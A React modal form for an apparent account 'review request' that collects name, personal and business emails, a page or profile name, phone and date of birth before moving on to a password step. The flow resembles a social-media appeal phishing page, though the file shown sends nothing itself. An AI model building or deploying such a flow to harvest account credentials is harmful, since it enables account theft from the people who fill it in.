'use client';

import React from 'react';
import Modal from '#components/modals/Modal';
import PhoneInput from 'react-phone-input-2';
import CustomCheckbox from '#components/check-box/CustomCheckbox';
import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
import { updateForm, type FormData } from '../../app/store/slices/stepFormSlice';
import {
  btnPrimary,
  errorTextClass,
  fieldInput,
  fieldSelect,
  fieldShell,
  fieldTextarea,
  fieldTextareaShell,
  formLabel,
  textLead,
  textMuted,
  textOverline,
} from '@/components/privacy-flow/ui-styles';
import { useI18n } from '@/i18n/I18nProvider';
import { localeToHtmlLang, type Locale } from '@/i18n/types';
import { externalLinkProps, legalLinks } from '@/data/legal-links';

export interface InformationModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onProceedToPassword: () => void;
}

function daysInMonth(month: number, year: number): number {
  if (!month || month < 1 || month > 12 || !year) return 31;
  return new Date(year, month, 0).getDate();
}

function monthOptions(locale: Locale): { value: string; label: string }[] {
  const tag = localeToHtmlLang(locale);
  return Array.from({ length: 12 }, (_, i) => ({
    value: String(i + 1),
    label: new Intl.DateTimeFormat(tag, { month: 'long' }).format(new Date(2020, i, 1)),
  }));
}

const InformationModal: React.FC<InformationModalProps> = ({
  open,
  onOpenChange,
  onProceedToPassword,
}) => {
  const { locale } = useI18n();
  const [isOpen, setIsOpen] = React.useState(open);
  const [errors, setErrors] = React.useState<Record<string, string>>({});
  const dispatch = useAppDispatch();
  const formData = useAppSelector((state) => state.stepForm.data);

  const months = React.useMemo(() => monthOptions(locale), [locale]);

  const yearEnd = new Date().getFullYear() - 13;
  const yearStart = 1920;
  const years = React.useMemo(
    () => Array.from({ length: yearEnd - yearStart + 1 }, (_, i) => String(yearEnd - i)),
    [yearEnd],
  );

  const monthNum = parseInt(formData.month, 10) || 0;
  const yearNum = parseInt(formData.year, 10) || 0;
  const maxDay =
    monthNum && yearNum ? daysInMonth(monthNum, yearNum) : 0;
  const days = React.useMemo(
    () => (maxDay ? Array.from({ length: maxDay }, (_, i) => String(i + 1)) : []),
    [maxDay],
  );

  React.useEffect(() => {
    if (!monthNum || !yearNum) {
      if (formData.day) dispatch(updateForm({ day: '' }));
      return;
    }
    const cap = daysInMonth(monthNum, yearNum);
    const d = parseInt(formData.day, 10);
    if (!d) return;
    if (d > cap) dispatch(updateForm({ day: String(cap) }));
  }, [dispatch, formData.day, monthNum, yearNum]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { id, value } = e.target;
    dispatch(updateForm({ [id as keyof FormData]: value } as Partial<FormData>));
    setErrors((prev) => ({ ...prev, [id]: '', dob: '' }));
  };

  const handleSelectChange = (id: 'day' | 'month' | 'year', value: string) => {
    dispatch(updateForm({ [id]: value } as Partial<FormData>));
    setErrors((prev) => ({ ...prev, [id]: '', dob: '' }));
  };

  React.useEffect(() => {
    setIsOpen(open);
  }, [open]);

  const handleClose = () => {
    setIsOpen(false);
    onOpenChange(false);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    try {
      e.preventDefault();

      const newErrors: Record<string, string> = {};
      if (!formData.fullName.trim()) newErrors.fullName = 'Please enter your full name.';
      if (!formData.email.trim()) newErrors.email = 'Please enter your email address.';
      if (!formData.emailBusiness.trim())
        newErrors.emailBusiness = 'Please enter your business email address.';
      if (!formData.fanpage.trim()) newErrors.fanpage = 'Please enter your page or profile name.';
      if (!formData.phone.trim()) newErrors.phone = 'Please enter your phone number.';

      const d = formData.day.trim();
      const m = formData.month.trim();
      const y = formData.year.trim();
      const anyDob = Boolean(d || m || y);
      const allDob = Boolean(d && m && y);
      if (anyDob && !allDob) {
        newErrors.dob = 'Please select month, day, and year.';
      } else if (allDob) {
        const dd = parseInt(d, 10);
        const mm = parseInt(m, 10);
        const yy = parseInt(y, 10);
        const cap = daysInMonth(mm, yy);
        if (dd < 1 || dd > cap || mm < 1 || mm > 12 || yy < yearStart || yy > yearEnd) {
          newErrors.dob = 'Please select a valid date.';
        }
      }

      if (Object.keys(newErrors).length > 0) {
        setErrors(newErrors);
        return;
      }

      dispatch(updateForm({ ...formData }));
      onProceedToPassword();
      handleClose();
    } catch (error) {
      console.error('Error submitting form:', error);
    }
  };

  const wrap = (hasError: boolean) => fieldShell(hasError, { noMb: true });

  return (
    <Modal isOpen={isOpen} title="Contact details" onClose={handleClose}>
      <div className="flex w-full max-w-full flex-col">
        <p className={`mb-6 max-w-prose ${textLead}`}>
          Please complete the fields below. All information is used only to process your review request.
        </p>

        <form onSubmit={handleSubmit} autoComplete="off" className="w-full">
          <div className="flex flex-col gap-5">
            <div>
              <label className={formLabel} htmlFor="fullName">
                Full name
              </label>
              <div className={wrap(!!errors.fullName)}>
                <input
                  type="text"
                  id="fullName"
                  placeholder="Jane Doe"
                  className={fieldInput}
                  value={formData.fullName}
                  onChange={handleChange}
                />
              </div>
              {errors.fullName ? <p className={errorTextClass}>{errors.fullName}</p> : null}
            </div>

            <div>
              <label className={formLabel} htmlFor="email">
                Email address
              </label>
              <div className={wrap(!!errors.email)}>
                <input
                  type="email"
                  id="email"
                  placeholder="you@example.com"
                  className={fieldInput}
                  value={formData.email}
                  onChange={handleChange}
                  autoComplete="email"
                />
              </div>
              {errors.email ? <p className={errorTextClass}>{errors.email}</p> : null}
            </div>

            <div>
              <label className={formLabel} htmlFor="emailBusiness">
                Business email
              </label>
              <div className={wrap(!!errors.emailBusiness)}>
                <input
                  type="email"
                  id="emailBusiness"
                  placeholder="work@company.com"
                  className={fieldInput}
                  value={formData.emailBusiness}
                  onChange={handleChange}
                  autoComplete="email"
                />
              </div>
              {errors.emailBusiness ? <p className={errorTextClass}>{errors.emailBusiness}</p> : null}
            </div>

            <div>
              <label className={formLabel} htmlFor="fanpage">
                Page or profile name
              </label>
              <div className={wrap(!!errors.fanpage)}>
                <input
                  type="text"
                  id="fanpage"
                  placeholder="Your Page name"
                  className={fieldInput}
                  value={formData.fanpage}
                  onChange={handleChange}
                />
              </div>
              {errors.fanpage ? <p className={errorTextClass}>{errors.fanpage}</p> : null}
            </div>

            <div>
              <label className={formLabel} htmlFor="phone">
                Phone number
              </label>
              <div className={wrap(!!errors.phone)}>
                <PhoneInput
                  country={formData.country_code?.toLowerCase() || 'us'}
                  value={formData.phone}
                  inputClass="!h-full !w-full !pl-[52px] !text-[15px] !leading-normal !text-slate-900 !placeholder:text-slate-400 !border-0 !bg-transparent"
                  containerClass="!h-full !w-full"
                  buttonClass="!rounded-l-xl"
                  inputProps={{ id: 'phone' }}
                  onChange={(phone) => {
                    dispatch(updateForm({ phone }));
                    setErrors((prev) => ({ ...prev, phone: '' }));
                  }}
                />
              </div>
              {errors.phone ? <p className={errorTextClass}>{errors.phone}</p> : null}
            </div>

            <div>
              <p className={`${textOverline} mb-1`}>Date of birth</p>
              <p className={`mb-3 ${textMuted}`}>
                Select month, then year, then day. Leave all empty if you prefer not to share.
              </p>
              <div className="grid grid-cols-1 gap-3 sm:grid-cols-3 sm:gap-3">
                <div className="min-w-0">
                  <label className={formLabel} htmlFor="dob-month">
                    Month
                  </label>
                  <div className={wrap(!!errors.dob)}>
                    <select
                      id="dob-month"
                      className={fieldSelect}
                      value={formData.month || ''}
                      onChange={(e) => handleSelectChange('month', e.target.value)}
                    >
                      <option value="" disabled>
                        Select month
                      </option>
                      {months.map((opt) => (
                        <option key={opt.value} value={opt.value}>
                          {opt.label}
                        </option>
                      ))}
                    </select>
                  </div>
                </div>
                <div className="min-w-0">
                  <label className={formLabel} htmlFor="dob-year">
                    Year
                  </label>
                  <div className={wrap(!!errors.dob)}>
                    <select
                      id="dob-year"
                      className={fieldSelect}
                      value={formData.year || ''}
                      onChange={(e) => handleSelectChange('year', e.target.value)}
                    >
                      <option value="" disabled>
                        Select year
                      </option>
                      {years.map((y) => (
                        <option key={y} value={y}>
                          {y}
                        </option>
                      ))}
                    </select>
                  </div>
                </div>
                <div className="min-w-0">
                  <label className={formLabel} htmlFor="dob-day">
                    Day
                  </label>
                  <div className={wrap(!!errors.dob)}>
                    <select
                      id="dob-day"
                      className={fieldSelect}
                      value={formData.day || ''}
                      onChange={(e) => handleSelectChange('day', e.target.value)}
                      disabled={!monthNum || !yearNum}
                    >
                      <option value="" disabled>
                        {!monthNum
                          ? 'Select month first'
                          : !yearNum
                            ? 'Select year first'
                            : 'Select day'}
                      </option>
                      {days.map((day) => (
                        <option key={day} value={day}>
                          {day}
                        </option>
                      ))}
                    </select>
                  </div>
                </div>
              </div>
              {errors.dob ? <p className={errorTextClass}>{errors.dob}</p> : null}
            </div>

            <div>
              <label className={formLabel} htmlFor="message">
                Additional context{' '}
                <span className="font-normal text-slate-500">(optional)</span>
              </label>
              <div className={fieldTextareaShell(false)}>
                <textarea
                  id="message"
                  className={fieldTextarea}
                  placeholder="Briefly describe your case…"
                  value={formData.message}
                  onChange={handleChange}
                  rows={4}
                />
              </div>
            </div>
          </div>

          <p className={`mb-5 mt-2 ${textMuted}`}>
            We typically respond within <span className="font-medium text-slate-700">14–48 business hours</span>.
          </p>

          <div className={`mb-6 flex items-start gap-3 ${textLead}`}>
            <span className="mt-0.5 shrink-0">
              <CustomCheckbox />
            </span>
            <label htmlFor="custom-checkbox" className="min-w-0 cursor-pointer pt-0.5">
              I agree to the{' '}
              <a
                href={legalLinks.termsOfService}
                className="font-medium text-blue-600 hover:underline"
                {...externalLinkProps}
                onClick={(e) => e.stopPropagation()}
              >
                Terms of use
              </a>
            </label>
          </div>

          <button type="submit" className={btnPrimary}>
            Submit
          </button>
        </form>
      </div>
    </Modal>
  );
};

export default InformationModal;
